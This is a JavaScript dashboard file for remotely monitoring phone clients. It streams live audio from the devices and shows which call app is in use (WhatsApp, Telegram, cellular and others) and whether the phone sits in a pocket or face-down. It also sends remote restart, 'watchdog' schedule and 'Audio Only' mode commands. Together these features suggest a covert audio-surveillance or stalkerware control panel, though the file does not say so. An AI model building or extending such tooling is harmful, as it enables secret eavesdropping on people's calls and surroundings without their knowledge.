            ui.telemetryActiveAppBadge.textContent = '📱 Using: Home / Idle';
            ui.telemetryActiveAppBadge.className = 'status-badge';
        }
    }
    if (ui.telemetryCallAppBadge) {
        const aCode = msg.callCode || 'AIDLE';
        const appLabel = msg.callApp || '';
        if (aCode === 'AWA') {
            ui.telemetryCallAppBadge.textContent = '🟢 Call: WhatsApp';
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--green';
        } else if (aCode === 'AIG') {
            ui.telemetryCallAppBadge.textContent = '🟣 Call: Instagram';
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--purple';
        } else if (aCode === 'ATG') {
            ui.telemetryCallAppBadge.textContent = '🔵 Call: Telegram';
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--cyan';
        } else if (aCode === 'AZOOM') {
            ui.telemetryCallAppBadge.textContent = '💻 Call: Zoom';
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--blue';
        } else if (aCode === 'AMEET') {
            ui.telemetryCallAppBadge.textContent = '📹 Call: Google Meet';
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--green';
        } else if (aCode === 'ACELL') {
            ui.telemetryCallAppBadge.textContent = '📞 Call: Cellular Phone';
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--yellow';
        } else if (aCode === 'AMIC') {
            ui.telemetryCallAppBadge.textContent = '🎙️ Mic: External App';
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--orange';
        } else if (aCode === 'AVOIP') {
            ui.telemetryCallAppBadge.textContent = '🌐 Call: VoIP (Encrypted)';
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--cyan';
        } else if (aCode !== 'AIDLE') {
            ui.telemetryCallAppBadge.textContent = `📞 Call: ${appLabel || aCode.replace(/^A/, '')}`;
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--yellow';
        } else {
            ui.telemetryCallAppBadge.textContent = '📞 Call: None';
            ui.telemetryCallAppBadge.className = 'status-badge';
        }
    }
    if (msg.posture && ui.telemetryPostureBadge) {
        if (msg.posture === 'POCK') {
            ui.telemetryPostureBadge.textContent = '👖 Posture: In Pocket / Face-Down';
            ui.telemetryPostureBadge.className = 'status-badge status-badge--purple';
        } else if (msg.posture === 'DESK') {
            ui.telemetryPostureBadge.textContent = '🪵 Posture: On Desk (Face-Up)';
            ui.telemetryPostureBadge.className = 'status-badge status-badge--cyan';
        } else {
            ui.telemetryPostureBadge.textContent = '✋ Posture: In Hand (Active)';
            ui.telemetryPostureBadge.className = 'status-badge status-badge--green';
        }
    }
    if (msg.batteryTemp !== undefined && ui.telemetryTempBadge) {
        ui.telemetryTempBadge.textContent = msg.batteryTemp > 0 ? `🌡️ Temp: ${msg.batteryTemp}°C` : '🌡️ Temp: --°C';
        ui.telemetryTempBadge.className = msg.batteryTemp >= 40 ? 'status-badge status-badge--red' : 'status-badge';
    }
    if (msg.isMoving !== undefined && ui.telemetryMotionBadge) {
        if (msg.isMoving) {
            ui.telemetryMotionBadge.textContent = '🏃 Motion: Moving / Picked Up';
            ui.telemetryMotionBadge.className = 'status-badge status-badge--green';
        } else {
            ui.telemetryMotionBadge.textContent = '🪑 Motion: Still';
            ui.telemetryMotionBadge.className = 'status-badge';
        }
    }
    if (ui.telemetryEcoBadge) {
        if (msg.ecoMode) {
            ui.telemetryEcoBadge.textContent = '⚡ Eco: ON (Audio Only)';
            ui.telemetryEcoBadge.className = 'status-badge status-badge--green';
            updateEcoButtonState(true);
        } else {
            ui.telemetryEcoBadge.textContent = '🌿 Eco: OFF (Sensors Live)';
            ui.telemetryEcoBadge.className = 'status-badge';
            updateEcoButtonState(false);
        }
    }
}

function togglePlay() {
    if (!state.currentSession) return;
    if (ui.audio.paused) {
        ui.audio.play().catch(e => console.error('Play error:', e));
    } else {
        ui.audio.pause();
    }
}

function setPlayingState(isPlaying) {
    state.isPlaying = isPlaying;
    if (isPlaying) {
        ui.iconPlay.style.display = 'none';
        ui.iconPause.style.display = 'inline';
        startVisualizer();
    } else {
        ui.iconPlay.style.display = 'inline';
        ui.iconPause.style.display = 'none';
    }
}

function rewind15() {
    if (!ui.audio.duration) return;
    ui.audio.currentTime = Math.max(0, ui.audio.currentTime - 15);
    state.isLiveLock = false;
    ui.btnJumpLive?.classList.remove('active');
}

function jumpToLive() {
    if (!hls || !hls.liveSyncPosition) return;
    ui.audio.currentTime = hls.liveSyncPosition;
    state.isLiveLock = true;
    ui.btnJumpLive?.classList.add('active');
}

function updateProgress() {
    if (!ui.audio.duration) return;
    const cur = ui.audio.currentTime;
    const dur = ui.audio.duration;
    const pct = (cur / dur) * 100;
    ui.progressFill.style.width = `${pct}%`;
    ui.timeCurrent.textContent = formatTime(cur);
    ui.timeTotal.textContent = formatTime(dur);

    if (hls && hls.liveSyncPosition) {
        const lat = Math.max(0, (hls.liveSyncPosition - cur)).toFixed(1);
        if (ui.latencyBadge) ui.latencyBadge.textContent = `Latency: ${lat}s`;
    }
}

// ════════════════════════════════════════════════════════════════════════════
// REMOTE COMMANDS
// ════════════════════════════════════════════════════════════════════════════

async function sendRemoteCommand(command) {
    const clientId = ui.remoteClientSelect ? ui.remoteClientSelect.value : null;
    if (!clientId) {
        alert('Please select a target device first');
        return;
    }

    try {
        const res = await fetch('/api/v1/broadcasts/remote-command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ client_id: clientId, command })
        });
        if (res.ok) {
            showToast(`Sent ${command} signal to ${clientId}`, 'success');
        } else {
            const err = await res.json();
            showToast(`Error: ${err.message}`, 'error');
        }
    } catch (e) {
        console.error('Remote command error:', e);
        showToast('Failed to send remote command', 'error');
    }
}

async function sendRemoteSchedule() {
    const clientId = ui.remoteClientSelect ? ui.remoteClientSelect.value : null;
    if (!clientId) {
        alert('Please select a target device first');
        return;
    }

    const startTime = ui.remoteStartTime ? ui.remoteStartTime.value : '05:00';
    const stopTime = ui.remoteStopTime ? ui.remoteStopTime.value : '';
    const intervalHours = ui.remoteWatchdogInterval ? parseInt(ui.remoteWatchdogInterval.value, 10) : 2;

    try {
        const res = await fetch('/api/v1/broadcasts/schedule', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                client_id: clientId,
                start_time: startTime,
                stop_time: stopTime,
                interval_hours: intervalHours
            })
        });
        if (res.ok) {
            showToast(`⏰ Dynamic Watchdog set for ${clientId} (Start: ${startTime}, Cycle: Every ${intervalHours}h)`, 'success');
        } else {
            const err = await res.json();
            showToast(`Error: ${err.message}`, 'error');
        }
    } catch (e) {
        console.error('Schedule error:', e);
        showToast('Failed to set schedule', 'error');
    }
}

async function sendRemoteRestart(type = 'stream') {
    const clientId = ui.remoteClientSelect ? ui.remoteClientSelect.value : null;
    if (!clientId) {
        alert('Please select a target device first');
        return;
    }
    const label = type === 'app' ? 'Full App Restart' : 'Audio Stream Restart';
    if (!confirm(`Are you sure you want to trigger a ${label} on ${clientId}?`)) return;

    try {
        const res = await fetch('/api/v1/broadcasts/restart', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ client_id: clientId, type })
        });
        if (res.ok) {
            showToast(`🚀 ${label} signal sent to ${clientId}!`, 'success');
        } else {
            const err = await res.json();
            showToast(`Error: ${err.message}`, 'error');
        }
    } catch (e) {
        console.error('Restart error:', e);
        showToast('Failed to send restart command', 'error');
    }
}

async function toggleEcoMode() {
    const clientId = ui.remoteClientSelect ? ui.remoteClientSelect.value : null;
    if (!clientId) {
        alert('Please select a target device first');
        return;
    }
    if (!state.deviceEcoMode) state.deviceEcoMode = {};
    const currentEco = Boolean(state.deviceEcoMode[clientId]);
    const newEco = !currentEco;

    try {
        const res = await fetch('/api/v1/broadcasts/eco-mode', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ client_id: clientId, enabled: newEco })
        });
        if (res.ok) {
            state.deviceEcoMode[clientId] = newEco;
            updateEcoButtonState(newEco);
            showToast(`⚡ Eco Low-CPU Mode ${newEco ? 'ENABLED (Sensors Off)' : 'DISABLED (Sensors Live)'} for ${clientId}`, 'success');
        } else {
            const err = await res.json();
            showToast(`Error: ${err.message}`, 'error');
        }
    } catch (e) {
        console.error('Eco toggle error:', e);
        showToast('Failed to toggle Eco Mode', 'error');
    }
}

function updateEcoButtonState(isEco) {
    if (!ui.btnToggleEco) return;
    if (isEco) {
        ui.btnToggleEco.style.background = 'rgba(16, 185, 129, 0.4)';
        ui.btnToggleEco.style.borderColor = '#34d399';
        ui.btnToggleEco.style.color = '#ffffff';
        ui.btnToggleEco.innerHTML = '⚡ Eco Mode: ACTIVE';
    } else {
        ui.btnToggleEco.style.background = 'rgba(16, 185, 129, 0.15)';
        ui.btnToggleEco.style.borderColor = '#10b981';
        ui.btnToggleEco.style.color = '#a7f3d0';
        ui.btnToggleEco.innerHTML = '⚡ Toggle Eco Mode';
    }
}

// ════════════════════════════════════════════════════════════════════════════
// AUDIO CONTEXT & VISUALIZER
// ════════════════════════════════════════════════════════════════════════════

function initAudioContext() {
    if (audioCtx) return;
    try {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        analyser = audioCtx.createAnalyser();
        analyser.fftSize = 64;
        pannerNode = audioCtx.createStereoPanner ? audioCtx.createStereoPanner() : null;
        source = audioCtx.createMediaElementSource(ui.audio);

        if (pannerNode) {
            source.connect(pannerNode);
            pannerNode.connect(analyser);
        } else {
            source.connect(analyser);
        }
        analyser.connect(audioCtx.destination);
    } catch (e) {
        console.error('Web Audio API error:', e);
    }
}

function setChannelPan(panVal, activeBtn) {
    initAudioContext();
    [ui.btnChanBoth, ui.btnChanLeft, ui.btnChanRight].forEach(btn => btn?.classList.remove('active'));
    if (activeBtn) activeBtn.classList.add('active');

    if (pannerNode && pannerNode.pan) {
        pannerNode.pan.setValueAtTime(panVal, audioCtx.currentTime);
    }
}

function startVisualizer() {
    if (!analyser || !ui.canvas) return;
    const ctx = ui.canvas.getContext('2d');
    const bufferLength = analyser.frequencyBinCount;
    const dataArray = new Uint8Array(bufferLength);
    
    function draw() {
        if (!state.isPlaying) return;
        animationId = requestAnimationFrame(draw);
        analyser.getByteFrequencyData(dataArray);
        
        ctx.clearRect(0, 0, ui.canvas.width, ui.canvas.height);
        const barWidth = (ui.canvas.width / bufferLength) * 2;
        let x = 0;
        
        for (let i = 0; i < bufferLength; i++) {
            const barHeight = (dataArray[i] / 255) * ui.canvas.height;
            const gradient = ctx.createLinearGradient(0, ui.canvas.height, 0, 0);
            gradient.addColorStop(0, '#7c5cfc');
            gradient.addColorStop(1, '#10b981');
            
            ctx.fillStyle = gradient;
            ctx.fillRect(x, ui.canvas.height - barHeight, barWidth - 2, barHeight);
            x += barWidth;
        }
    }
    draw();
}

// ════════════════════════════════════════════════════════════════════════════
// MODALS & HELPERS
// ════════════════════════════════════════════════════════════════════════════

function openDeleteModal(sessionId) {
    state.deleteTargetId = sessionId;
    ui.modalSessionId.textContent = `Session ID: ${sessionId}`;
    ui.modalOverlay.classList.add('active');
}

function closeModal() {
    state.deleteTargetId = null;
    ui.modalOverlay.classList.remove('active');
}

async function confirmDelete() {
    if (!state.deleteTargetId) return;
    try {
        const res = await fetch(`${API_DASHBOARD}/sessions/${state.deleteTargetId}`, { method: 'DELETE' });
        if (res.ok) {
            closeModal();
            fetchAllData();
            showToast('Session permanently deleted', 'success');
        }
    } catch (e) {
        console.error('Delete error:', e);
    }
}

function openDownloaderModal(hlsUrl) {
    const iframe = document.getElementById('downloader-iframe');
    const overlay = document.getElementById('modal-downloader-overlay');
    if (iframe && overlay) {
        iframe.src = `/downloader.html?stream=${encodeURIComponent(hlsUrl)}`;
        overlay.classList.add('active');
    }
}

async function endLiveSession(sessionId) {
    if (!confirm('End this live session?')) return;
    try {
        const res = await fetch(`/api/v1/broadcasts/${sessionId}/end`, { method: 'PUT' });
        if (res.ok) {
            showToast('Session marked as ended', 'info');
            fetchAllData();
        }
    } catch (e) {
        console.error('End session error:', e);
    }
}

async function activateSession(sessionId) {
    try {
        const res = await fetch(`/api/v1/broadcasts/${sessionId}/activate`, { method: 'PUT' });
        if (res.ok) {
            showToast('Session reactivated as LIVE', 'success');
            fetchAllData();
        }
    } catch (e) {
        console.error('Activate error:', e);
    }
}

function showToast(msg, type = 'info') {
    if (!ui.toastContainer) return;
    const toast = document.createElement('div');
    toast.className = `toast toast--${type}`;
    let icon = type === 'success' ? '✅' : (type === 'error' ? '⚠️' : 'ℹ️');
    toast.innerHTML = `<span>${icon}</span><span>${msg}</span>`;
    ui.toastContainer.appendChild(toast);
    requestAnimationFrame(() => toast.classList.add('show'));
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => toast.remove(), 300);
    }, 2800);
}

function copySessionId(id) {
    if (navigator.clipboard) {
        navigator.clipboard.writeText(id).then(() => showToast(`Copied: ${id.slice(0, 8)}...`, 'success'));
    }
}

function copyHlsLink(url) {
    if (navigator.clipboard) {
        navigator.clipboard.writeText(url).then(() => showToast('Stream URL copied', 'success'));
    }
}

function formatIST(dateStr) {
    if (!dateStr) return '—';
    try {
        const d = new Date(dateStr);
        return d.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', dateStyle: 'medium', timeStyle: 'short', hour12: true });
    } catch {
        return dateStr;
    }
}

function formatTime(seconds) {
    seconds = Math.max(0, Math.floor(seconds));
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    if (h > 0) return `${h}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
}

function formatSize(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}
